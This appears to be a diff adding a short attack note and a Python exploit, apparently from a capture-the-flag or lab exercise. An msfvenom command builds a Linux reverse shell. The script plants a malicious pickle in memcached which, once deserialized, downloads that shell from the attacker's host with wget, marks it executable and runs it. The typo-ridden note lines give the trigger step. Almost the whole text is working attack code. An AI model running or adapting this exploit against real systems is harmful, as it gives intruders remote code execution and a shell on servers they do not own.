@@ -1,0 +1,16 @@
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.83.219 LPORT=11211
+pythob3 -m htt.server 5000 and go to ip/admin to trigger it ad get shell
+
+import pickle
+import os
+import sys
+from pymemcache.client import base
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
+        return os.system, (cmd,)
+
+if __name__ == '__main__':
+    client = base.Client((sys.argv[2], 11211))
+    client.set(sys.argv[3], pickle.dumps(RCE()))
